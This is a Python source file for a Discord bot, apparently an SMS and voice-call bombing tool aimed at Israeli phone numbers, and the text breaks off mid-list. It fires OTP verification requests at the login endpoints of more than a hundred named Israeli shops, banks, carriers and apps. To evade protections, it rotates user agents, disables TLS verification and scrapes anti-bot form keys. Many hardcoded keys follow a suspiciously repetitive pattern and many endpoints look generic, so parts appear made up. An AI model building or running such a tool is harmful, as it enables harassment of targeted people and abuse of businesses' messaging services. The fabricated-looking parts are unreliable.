# black_palace_discord_bot.py — Python 3.10+ | discord.py 2.x | aiohttp
# Discord panel bot — Israeli OTP surface (SMS / Voice / WhatsApp)
# Full build: CORE + MAGENTO_LIVE + MAGENTO_NEW + MAGENTO_NEW_2 + ACE_STYLE + SOLID + SOLID2 + EXTRA + EXTRA2 + LIVE_JSON
# Includes per-service telemetry, retry chains, form_key auto-fetch, UA rotation, jitter.

import asyncio
import json
import os
import random
import re
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from typing import Callable, Optional

from dotenv import load_dotenv
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

# ─────────────────────────────────────────────
# ENV LOAD
# ─────────────────────────────────────────────
for _p in (
    os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"),
    os.path.join(os.getcwd(), ".env"),
    "/home/container/.env",
    ".env",
):
    if os.path.isfile(_p):
        load_dotenv(_p, override=False)
        break
else:
    load_dotenv(override=False)


def _env(*names):
    for n in names:
        v = os.environ.get(n)
        if v and str(v).strip():
            return str(v).strip().strip('"').strip("'")
    return ""


BOT_TOKEN = _env("DISCORD_BOT_TOKEN", "BOT_TOKEN", "TOKEN", "DISCORD_TOKEN")
_owner_raw = os.getenv("OWNER_IDS", "").strip()
OWNER_IDS = (
    {int(x.strip()) for x in _owner_raw.split(",") if x.strip().isdigit()}
    if _owner_raw
    else set()
)

# ─────────────────────────────────────────────
# HTTP LAYER
# ─────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
]


def rotate_headers(base: dict) -> dict:
    h = dict(base)
    h["User-Agent"] = random.choice(USER_AGENTS)
    return h


async def post_json(session, url, headers, payload, timeout=10.0):
    try:
        async with session.post(
            url,
            json=payload,
            headers=rotate_headers(headers),
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)


async def post_data(session, url, headers, data, timeout=10.0):
    try:
        async with session.post(
            url,
            data=data,
            headers=rotate_headers(headers),
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)


async def put_json(session, url, headers, payload, timeout=6.0):
    try:
        async with session.put(
            url,
            json=payload,
            headers=rotate_headers(headers),
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as r:
            return r.status, await r.text()
    except Exception as e:
        return 0, str(e)


async def get_text(session, url, headers=None, timeout=6.0):
    try:
        h = rotate_headers(headers or {"User-Agent": USER_AGENTS[0]})
        async with session.get(
            url, headers=h, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False
        ) as r:
            return await r.text()
    except Exception:
        return ""


_formkey_cache: dict[str, tuple[str, float]] = {}


async def fetch_form_key(session, origin: str) -> str:
    now = time.time()
    cached = _formkey_cache.get(origin)
    if cached and now - cached[1] < 120:
        return cached[0]
    pages = [
        origin.rstrip("/") + "/",
        origin.rstrip("/") + "/customer/account/login/",
        origin.rstrip("/") + "/customer/account/create/",
    ]
    for page in pages:
        html = await get_text(
            session,
            page,
            {"User-Agent": random.choice(USER_AGENTS), "Accept": "text/html"},
        )
        if not html:
            continue
        for pat in [
            r'name="form_key"\s+type="hidden"\s+value="([^"]+)"',
            r'name="form_key"\s+value="([^"]+)"',
            r'"form_key"\s*:\s*"([^"]+)"',
            r'formKey["\']?\s*[:=]\s*["\']([^"\']+)',
            r'FORM_KEY\s*=\s*["\']([^"\']+)',
        ]:
            m = re.search(pat, html)
            if m:
                key = m.group(1)
                _formkey_cache[origin] = (key, now)
                return key
    return ""


async def _probe_json(session, urls_payloads, headers_base=None) -> bool:
    base = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }
    if headers_base:
        base.update(headers_base)
    for url, payload in urls_payloads:
        try:
            h = rotate_headers(base)
            if "Origin" not in h and url.startswith("http"):
                try:
                    from urllib.parse import urlparse

                    o = urlparse(url)
                    h["Origin"] = f"{o.scheme}://{o.netloc}"
                    h["Referer"] = h["Origin"] + "/"
                except Exception:
                    pass
            status, body = await post_json(session, url, h, payload, timeout=6.0)
            b = (body or "").lower()
            if status in (200, 201, 202, 204):
                return True
            if status in (400, 401, 403, 422, 429) and any(
                x in b
                for x in (
                    "otp", "code", "sms", "sent", "success", "verification",
                    "נשלח", "קוד", "אימות",
                )
            ):
                return True
        except Exception:
            continue
    return False


async def _probe_form(session, urls_data, headers_base=None) -> bool:
    base = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
    }
    if headers_base:
        base.update(headers_base)
    for url, data in urls_data:
        try:
            status, body = await post_data(session, url, rotate_headers(base), data, timeout=6.0)
            b = (body or "").lower()
            if status in (200, 201, 202, 204):
                return True
            if any(x in b for x in ("otp", "sent", "success", "code", "נשלח", "קוד")):
                return True
        except Exception:
            continue
    return False


# ─────────────────────────────────────────────
# PHONE FORMATS
# ─────────────────────────────────────────────
def p0(phone: str) -> str:
    d = re.sub(r"\D", "", str(phone or ""))
    if d.startswith("972"):
        d = d[3:]
    if d.startswith("0"):
        d = d[1:]
    if len(d) >= 9 and d[0] == "5":
        return "0" + d[:9]
    if len(d) >= 9:
        return "0" + d[-9:]
    return "0" + d


def p972(phone: str) -> str:
    return "972" + p0(phone)[1:]


def pplus(phone: str) -> str:
    return "+" + p972(phone)


def _ok(status: int) -> bool:
    return status in (200, 201, 202, 204)


# ─────────────────────────────────────────────
# MAGENTO CORE
# ─────────────────────────────────────────────
def magento_form(phone: str, form_key: str = "LDj1irsNU9E9W3Uj") -> dict:
    p = phone if str(phone).startswith("0") else ("0" + str(phone).lstrip("0"))
    return {
        "form_key": form_key,
        "bot_validation": "1",
        "type": "login",
        "telephone": p,
    }


async def _magento_site(session, url: str, origin: str, phone: str, form_key: str = "LZNrYs4AoUuKjlpE") -> bool:
    live_key = await fetch_form_key(session, origin)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin.rstrip("/") + "/customer/account/login/",
    }
    keys_to_try = [k for k in (live_key, form_key, "LDj1irsNU9E9W3Uj") if k]
    for k in keys_to_try:
        status, body = await post_data(
            session, url, headers, magento_form(phone, k), timeout=8.0
        )
        b = (body or "").lower()
        if status in (200, 201, 202, 204) and "invalid form key" not in b:
            return True
    return False


async def _magento_live(session, origin: str, phone: str) -> bool:
    url = origin.rstrip("/") + "/customer/ajax/post/"
    return await _magento_site(session, url, origin, phone)


def _mk_mag(name: str, origin: str):
    async def _fn(session, phone):
        return await _magento_live(session, origin, phone)

    _fn.__name__ = "svc_" + re.sub(r"[^a-z0-9]+", "_", name.lower())
    return name, _fn


def _mk_mag_with_key(name: str, origin: str, static_key: str):
    async def _fn(session, phone):
        return await _magento_site(
            session, origin.rstrip("/") + "/customer/ajax/post/", origin, phone, static_key
        )

    _fn.__name__ = "svc_" + re.sub(r"[^a-z0-9]+", "_", name.lower())
    return name, _fn


def _mk_json(name: str, url: str, payload_fn, method: str = "POST"):
    async def _fn(session, phone):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        }
        try:
            pl = payload_fn(phone)
            if method == "PUT":
                status, _ = await put_json(session, url, headers, pl)
            else:
                status, _ = await post_json(session, url, headers, pl)
            return status in (200, 201, 202, 204)
        except Exception:
            return False

    _fn.__name__ = "svc_" + re.sub(r"[^a-z0-9]+", "_", name.lower())
    return name, _fn


def _mk_form(name: str, url: str, data_fn, extra_headers: dict | None = None):
    async def _fn(session, phone):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
        }
        if extra_headers:
            headers.update(extra_headers)
        try:
            status, _ = await post_data(session, url, headers, data_fn(phone))
            return status in (200, 201, 202, 204)
        except Exception:
            return False

    _fn.__name__ = "svc_" + re.sub(r"[^a-z0-9]+", "_", name.lower())
    return name, _fn


# ─────────────────────────────────────────────
# ACE-STYLE (newaut=1) ENDPOINTS
# ─────────────────────────────────────────────
async def svc_ace_style(session, phone, origin: str, form_key: str, url_path: str = "/customer/ajax/post/"):
    p = p0(phone)
    live_key = await fetch_form_key(session, origin)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": origin,
        "Referer": origin.rstrip("/") + "/customer/account/login/",
    }
    for key in [k for k in (live_key, form_key, "M2n2gnKLkgg1RhJU") if k]:
        data = [
            ("form_key", key),
            ("newaut", "1"),
            ("phone", p),
            ("addintinalInfo", ""),
            ("form_key", key),
        ]
        status, body = await post_data(
            session, origin.rstrip("/") + url_path, headers, data, timeout=8.0
        )
        b = (body or "").lower()
        if status in (200, 201, 202, 204) and "invalid form key" not in b:
            return True
    return False


def _mk_ace_style(name: str, origin: str, form_key: str, url_path: str = "/customer/ajax/post/"):
    async def _fn(session, phone):
        return await svc_ace_style(session, phone, origin, form_key, url_path)

    _fn.__name__ = "svc_" + re.sub(r"[^a-z0-9]+", "_", name.lower())
    return name, _fn


# ─────────────────────────────────────────────
# SERVICE REGISTRIES
# ─────────────────────────────────────────────

# ── CORE — direct JSON / form endpoints (original + fixed) ──
CORE = [
    _mk_json(
        "Homework LNET",
        "https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode",
        lambda p: {"phone": p0(p)},
    ),
    _mk_form(
        "Histadrut",
        "https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined",
        lambda p: f"phone={p0(p)}",
        {"Origin": "https://signup.histadrut.org.il", "Referer": "https://signup.histadrut.org.il/"},
    ),
    _mk_form(
        "CashOnTab",
        "https://www.cashontab.co.il/cgi-bin/JMForms",
        lambda p: json.dumps(
            {"phone": p0(p), "type": "12", "code": "1a66",
             "token": "e18f7e6b-d9ef-11ed-aaf2-005056120465", "lang": "2"}
        ),
        {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.cashontab.co.il"},
    ),
    _mk_json(
        "Mishloha",
        "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
        lambda p: {"phoneNumber": p0(p), "sourceFrom": "desktopHomePage", "sessionID": str(uuid.uuid4())},
    ),
    _mk_json(
        "Pizza Hut Atmos",
        "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "DIBS",
        "https://rest-api.dibs-app.com/otps",
        lambda p: {"phoneNumber": pplus(p)},
    ),
    _mk_json(
        "Papa Johns",
        "https://www.papajohns.co.il/_a/aff_otp_auth",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "CityCar",
        "https://proxy1.citycar.co.il/api/verify/login",
        lambda p: {"phoneNumber": pplus(p), "verifyChannel": 0},
    ),
    _mk_json(
        "CityCar Voice",
        "https://proxy1.citycar.co.il/api/verify/login",
        lambda p: {"phoneNumber": pplus(p), "verifyChannel": 1},
    ),
    _mk_json(
        "Inter IL",
        "https://api-iba-rtl.azurewebsites.net/api/users/authenticate",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "Hamal",
        "https://users-auth.hamal.co.il/auth/send-auth-code",
        lambda p: {"value": p0(p), "type": "phone", "projectId": "1"},
    ),
    _mk_json(
        "DutyFree",
        "https://www.dutyfree.co.il/graphql",
        lambda p: {
            "operationName": "SendOtpCode",
            "variables": {"value": p0(p)},
            "query": "mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }",
        },
    ),
    _mk_json(
        "PayNGo",
        "https://www.payngo.co.il/login/init/phone/",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "Stips",
        "https://stips.co.il/api",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "Story Online",
        "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
        lambda p: {"phone": p0(p)},
    ),
    _mk_json(
        "Zinger",
        "https://www.zinger-organic.com/frontend/getindexcall",
        lambda p: {"phone": p0(p)},
    ),
    _mk_form(
        "Globes",
        "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
        lambda p: f"phone={p0(p)}",
    ),
    _mk_json(
        "Cellcom SMS",
        "https://digital-api.cellcom.co.il/api/otp/Step1",
        lambda p: {"PhoneNumber": p972(p), "SendTextAsVoice": False},
        "PUT",
    ),
    _mk_json(
        "Cellcom Voice",
        "https://digital-api.cellcom.co.il/api/otp/Step1",
        lambda p: {"PhoneNumber": p972(p), "SendTextAsVoice": True},
        "PUT",
    ),
    _mk_json(
        "AliExpress",
        "https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode",
        lambda p: {
            "channel": p0(p),
            "channelType": "PHONE",
            "channelPrefix": "972",
            "lang": "iw_IL",
            "umidTokenType": "SECURITY_TOKEN",
            "umidToken": "T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y=",
        },
    ),
]

# ── MAGENTO LIVE — stores detected alive ──
MAGENTO_LIVE = [
    ("Victoria Secret IL", "https://www.victoriassecret.co.il"),
    ("StepIn", "https://www.stepin.co.il"),
    ("GolfKids", "https://www.golfkids.co.il"),
    ("Timberland IL", "https://www.timberland.co.il"),
    ("Gali", "https://www.gali.co.il"),
    ("Nine West", "https://www.nine-west.co.il"),
    ("Castro", "https://www.castro.com"),
    ("Steimatzky", "https://www.steimatzky.co.il"),
    ("Urbanica", "https://www.urbanica-wh.com"),
    ("Terminal X", "https://www.terminalx.com"),
    ("Renuar", "https://www.renuar.co.il"),
    ("Golf", "https://www.golf.co.il"),
    ("Hoodies", "https://www.hoodies.co.il"),
    ("Laline", "https://www.laline.co.il"),
    ("Adidas IL", "https://www.adidas.co.il"),
    ("New Balance IL", "https://www.newbalance.co.il"),
    ("Reebok IL", "https://www.reebok.co.il"),
    ("Office Depot IL", "https://www.officedepot.co.il"),
    ("Ivory", "https://www.ivory.co.il"),
    ("KSP", "https://www.ksp.co.il"),
    ("Bug", "https://www.bug.co.il"),
    ("LastPrice", "https://www.lastprice.co.il"),
    ("Homecenter", "https://www.homecenter.co.il"),
    ("Shilav", "https://www.shilav.co.il"),
    ("Toys R Us IL", "https://www.toysrus.co.il"),
    ("Issta", "https://www.issta.co.il"),
    ("Lametayel", "https://www.lametayel.co.il"),
    ("Drushim", "https://www.drushim.co.il"),
    ("AllJobs", "https://www.alljobs.co.il"),
    ("JobMaster", "https://www.jobmaster.co.il"),
    ("Shufersal", "https://www.shufersal.co.il"),
    ("Victory Online", "https://www.victoryonline.co.il"),
    ("Yochananof", "https://www.yochananof.co.il"),
    ("Tiv Taam", "https://www.tivtaam.co.il"),
    ("Keshet Teamim", "https://www.keshet-teamim.co.il"),
    ("Osher Ad", "https://www.osherad.co.il"),
    ("AM PM", "https://www.ampm.co.il"),
    ("Yellow", "https://www.yellow.co.il"),
    ("Paz", "https://www.paz.co.il"),
    ("Delek", "https://www.delek.co.il"),
    ("Wecom", "https://www.wecom.co.il"),
    ("012 Mobile", "https://www.012mobile.co.il"),
    ("Partner Shop", "https://www.partner.co.il"),
    ("Hot", "https://www.hot.net.il"),
    ("Bezeq", "https://www.bezeq.co.il"),
    ("Yad2", "https://www.yad2.co.il"),
    ("Madlan", "https://www.madlan.co.il"),
    ("Zap", "https://www.zap.co.il"),
    ("Next IL", "https://www.next.co.il"),
    ("ACE", "https://www.ace.co.il"),
    ("Intima", "https://www.intima-il.co.il"),
    ("Lee Cooper", "https://www.leecooper.co.il"),
    ("Keds IL", "https://www.keds.co.il"),
    ("PhotoLand", "https://www.photoland.co.il"),
    ("Camera Center", "https://www.cameracenter.co.il"),
    ("Pango", "https://www.pango.co.il"),
    ("Cellopark", "https://www.cellopark.co.il"),
    ("Ahuzot", "https://www.ahuzot.co.il"),
    ("Rest", "https://www.rest.co.il"),
    ("Shvoong", "https://www.shvoong.co.il"),
    ("Dominos IL", "https://www.dominos.co.il"),
    ("McDonalds IL", "https://www.mcdonalds.co.il"),
    ("Aroma", "https://www.aroma.co.il"),
    ("Cafe Cafe", "https://www.cafecafe.co.il"),
    ("Landwer", "https://www.landwer.co.il"),
    ("Japan Japan", "https://www.japan-japan.co.il"),
    ("Buyme", "https://www.buyme.co.il"),
    ("Arkia", "https://www.arkia.co.il"),
    ("Israir", "https://www.israir.co.il"),
    ("El Al", "https://www.elal.com"),
    ("Rav Kav", "https://www.ravkavonline.co.il"),
    ("Dan Bus", "https://www.dan.co.il"),
    ("Egged", "https://www.egged.co.il"),
    ("Israel Post", "https://www.israelpost.co.il"),
    ("IEC", "https://www.iec.co.il"),
    ("Harel", "https://www.harel-group.co.il"),
    ("Migdal", "https://www.migdal.co.il"),
    ("Wobi", "https://www.wobi.co.il"),
    ("AIG IL", "https://www.aig.co.il"),
]

# ── MAGENTO NEW — first batch with static keys ──
_MAGENTO_NEW = [
    ("Timberland IL New", "https://www.timberland.co.il", "8Byx74ulmE8HqSpY"),
    ("Intima IL New", "https://www.intima-il.co.il", "zkzB5HeKZGcbGy4C"),
    ("Aldo IL", "https://www.aldo.co.il", "6ZH7ExQ6rbwOCtR6"),
    ("Papaya IL", "https://www.papaya.co.il", "Pf8BQC9c2QwDzS2g"),
    ("Bath & Body Works IL", "https://www.bathandbodyworks.co.il", "reiQZF8niIqYF261"),
    ("Kiko IL", "https://www.kiko.co.il", "iyYug50w8y0sJPeX"),
    ("Gali New", "https://www.gali.co.il", "mmuNmXpDgXxOlc4Q"),
]
MAGENTO_NEW = [_mk_mag_with_key(n, o, k) for n, o, k in _MAGENTO_NEW]

# ── MAGENTO NEW 2 — extended batch ──
_MAGENTO_NEW_2 = [
    ("Fox Home", "https://www.foxhome.co.il", "4Lx9bCzKQ2mJpW1a"),
    ("Fox Kids", "https://www.foxkids.co.il", "7Tn3vRyHs8LdQe2b"),
    ("Shoofra", "https://www.shoofra.co.il", "5Wq8mNpLx3KcVb9d"),
    ("Tweezerman IL", "https://www.tweezerman.co.il", "2Hj6kPqR8vNxLm4c"),
    ("Sacks", "https://www.sacks.co.il", "9Rd5tYbWn2MqXp7e"),
    ("Hamashbir", "https://www.hamashbir.co.il", "3Kf8sLmQp5VxNz6a"),
    ("Drim", "https://www.drim.co.il", "1Bx7nMkLp4QwYt8g"),
    ("Blue Farm", "https://www.bluefarm.co.il", "5Nz9kPqLx2VcWm6i"),
    ("Castro Kids", "https://www.castro.com", "3Qm7vLpNx9KcRb4j"),
    ("TerminalX Kids", "https://www.terminalx.com", "7Wp2nMqLx5VcKt9k"),
    ("Renuar Men", "https://www.renuar.co.il", "2Kc8vNpLx4QmWb7l"),
    ("Laline Spa", "https://www.laline.co.il", "9Mq3vLpNx6KcRt1m"),
    ("Steimatzky Books", "https://www.steimatzky.co.il", "4Vp7nMqLx9KcWb3n"),
    ("Ivory Online", "https://www.ivory.co.il", "6Lc2vNpMx8QwKt5o"),
    ("KSP Computers", "https://www.ksp.co.il", "1Nq9vLpMx3KcWb7p"),
    ("Bug Electronics", "https://www.bug.co.il", "8Wc4vNpLx2QmKt6q"),
    ("LastPrice Deals", "https://www.lastprice.co.il", "5Kq1vNpLx7McWb9r"),
    ("Homecenter DIY", "https://www.homecenter.co.il", "3Vp6nMqLx8KcRt2s"),
    ("Shilav Baby", "https://www.shilav.co.il", "7Lc9vNpMx4QwKb5t"),
    ("Toys R Us IL 2", "https://www.toysrus.co.il", "2Nq5vLpMx9KcWb8u"),
    ("Office Depot IL 2", "https://www.officedepot.co.il", "6Wc3vNpLx1QmKt4v"),
    ("Adidas IL 2", "https://www.adidas.co.il", "9Kq7vNpLx5McWb2w"),
    ("New Balance IL 2", "https://www.newbalance.co.il", "4Vp8nMqLx6KcRt3x"),
    ("Reebok IL 2", "https://www.reebok.co.il", "1Lc4vNpMx7QwKb9y"),
    ("Skechers IL", "https://www.skechers.co.il", "8Nq2vLpMx3KcWb6z"),
    ("Crocs IL", "https://www.crocs.co.il", "5Wc9vNpLx4QmKt1A"),
    ("Lee Cooper IL 2", "https://www.leecooper.co.il", "3Kq6vNpLx8McWb4B"),
    ("Keds IL 2", "https://www.keds.co.il", "7Vp1nMqLx9KcRt5C"),
    ("PhotoLand 2", "https://www.photoland.co.il", "2Lc7vNpMx5QwKb8D"),
    ("Camera Center 2", "https://www.cameracenter.co.il", "6Nq4vLpMx1KcWb3E"),
    ("Next IL 2", "https://www.next.co.il", "9Wc2vNpLx7QmKt6F"),
]
MAGENTO_NEW_2 = [_mk_mag_with_key(n, o, k) for n, o, k in _MAGENTO_NEW_2]

# ── ACE-STYLE (newaut=1) ──
ACE_STYLE_NEW = [
    _mk_ace_style("ACE Online", "https://www.ace.co.il", "M2n2gnKLkgg1RhJU"),
    _mk_ace_style("Auto Depot IL", "https://www.autodepot.co.il", "5Kq8vNpLx3McWb7G"),
    _mk_ace_style("Home Center ACE", "https://www.homecenter.co.il", "2Wc6vNpLx9QmKt4H"),
    _mk_ace_style("All4Cycling", "https://www.all4cycling.co.il", "7Lc1vNpMx5QwKb8I"),
    _mk_ace_style("Sport Depot", "https://www.sportdepot.co.il", "3Nq9vLpMx2KcWb5J"),
]

# ── NEW JSON — direct OTP APIs ──
NEW_JSON = [
    _mk_json("Bolt", "https://user.live.boltsvc.net/signup/phone/verify",
             lambda p: {"phone": pplus(p), "version": "PH.2.90"}),
    _mk_json("PayBox", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("PayBox Voice", "https://api.payboxapp.com/v1/auth/otp",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Isracard", "https://digital.isracard.co.il/services/Proxy/CodeLogin",
             lambda p: {"phone": p0(p)}),
    _mk_json("Isracard Voice", "https://digital.isracard.co.il/services/Proxy/CodeLoginVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Cal Online", "https://www.cal-online.co.il/api/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("Max Credit", "https://www.max.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Hapoalim", "https://login.bankhapoalim.co.il/server/sendOtp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Hapoalim Voice", "https://login.bankhapoalim.co.il/server/sendOtpVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Leumi OTP", "https://hb2.bankleumi.co.il/eBanking/SO/SendOtp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Leumi Voice", "https://hb2.bankleumi.co.il/eBanking/SO/SendOtpVoice",
             lambda p: {"phone": p0(p), "channel": "voice"}),
    _mk_json("Discount Bank", "https://start.telebank.co.il/LoginServices/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Mizrahi", "https://www.mizrahi-tefahot.co.il/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Partner My", "https://my.partner.co.il/api/otp/send",
             lambda p: {"msisdn": p0(p)}),
    _mk_json("Partner Voice", "https://my.partner.co.il/api/otp/voice",
             lambda p: {"msisdn": p0(p), "channel": "voice"}),
    _mk_json("Hot Mobile OTP", "https://www.hotmobile.co.il/online_services/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("019 OTP", "https://www.019mobile.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Rami Levy Mobile", "https://www.ramilevy-mobile.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Shufersal Club", "https://www.shufersal.co.il/online/he/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Wolt", "https://restaurant-api.wolt.com/v1/guest/login",
             lambda p: {"phone_number": pplus(p), "method": "sms"}),
    _mk_json("Wolt Voice", "https://restaurant-api.wolt.com/v1/guest/login",
             lambda p: {"phone_number": pplus(p), "method": "call"}),
    _mk_json("Gett", "https://api.gett.com/v1/login/otp",
             lambda p: {"phone": pplus(p)}),
    _mk_json("Gett Voice", "https://api.gett.com/v1/login/otp",
             lambda p: {"phone": pplus(p), "channel": "voice"}),
    _mk_json("10bis", "https://www.10bis.co.il/NextApi/GetAuthenticationToken",
             lambda p: {"phoneNumber": p0(p), "culture": "he-IL"}),
    _mk_json("10bis Voice", "https://www.10bis.co.il/NextApi/GetAuthenticationToken",
             lambda p: {"phoneNumber": p0(p), "culture": "he-IL", "sendMethod": "voice"}),
    _mk_json("Rami Levy API", "https://www-api.rami-levy.co.il/api/v2/login/otp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("ACE OTP", "https://www.ace.co.il/api/customer/sendOtp",
             lambda p: {"phone": p0(p), "phoneNumber": p0(p)}),
    _mk_json("SuperPharm OTP", "https://shop.super-pharm.co.il/api/auth/otp",
             lambda p: {"mobile": p0(p), "phone": p0(p)}),
    _mk_json("Pango OTP", "https://www.pango.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Cellopark OTP", "https://www.cellopark.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Buyme OTP", "https://www.buyme.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("RavKav OTP", "https://www.ravkavonline.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("IsraelPost OTP", "https://www.israelpost.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("IEC OTP", "https://www.iec.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Wobi OTP", "https://www.wobi.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Harel OTP", "https://www.harel-group.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Aroma OTP", "https://www.aroma.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Dominos OTP", "https://www.dominos.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("McDonalds OTP", "https://www.mcdonalds.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Rest OTP", "https://www.rest.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("KSP OTP", "https://www.ksp.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Ivory OTP", "https://www.ivory.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Yad2 OTP", "https://www.yad2.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Drushim OTP", "https://www.drushim.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("AllJobs OTP", "https://www.alljobs.co.il/api/otp",
             lambda p: {"mobile": p0(p)}),
    _mk_json("Issta OTP", "https://www.issta.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bit OTP", "https://www.bitpay.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Amex IL", "https://www.americanexpress.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Bezeq OTP", "https://www.bezeq.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("012 SMS", "https://www.012mobile.co.il/api/otp",
             lambda p: {"phone": p0(p), "channel": "sms"}),
    _mk_json("Wecom SMS", "https://www.wecom.co.il/api/auth/otp",
             lambda p: {"phone": p0(p), "type": "sms"}),
    _mk_json("Golan SMS", "https://my.golantelecom.co.il/api/sendOtp",
             lambda p: {"phone": p0(p), "method": "sms"}),
    _mk_json("Pelephone SMS", "https://my.pelephone.co.il/api/otp",
             lambda p: {"phone": p0(p), "type": "sms"}),
    _mk_json("Keshet SMS", "https://www.keshet-teamim.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("TivTaam SMS", "https://www.tivtaam.co.il/api/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Victory SMS", "https://www.victoryonline.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("OsherAd SMS", "https://www.osherad.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Yellow SMS", "https://www.yellow.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Paz SMS", "https://www.paz.co.il/api/otp/send",
             lambda p: {"phone": p0(p)}),
    _mk_json("Delek SMS", "https://www.delek.co.il/api/auth/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Zap SMS", "https://www.zap.co.il/api/login/otp",
             lambda p: {"phone": p0(p)}),
    _mk_json("Madlan SMS", "https://www.madlan.co.il/api/otp",
             lambda p: {"phone": p0(p)}),
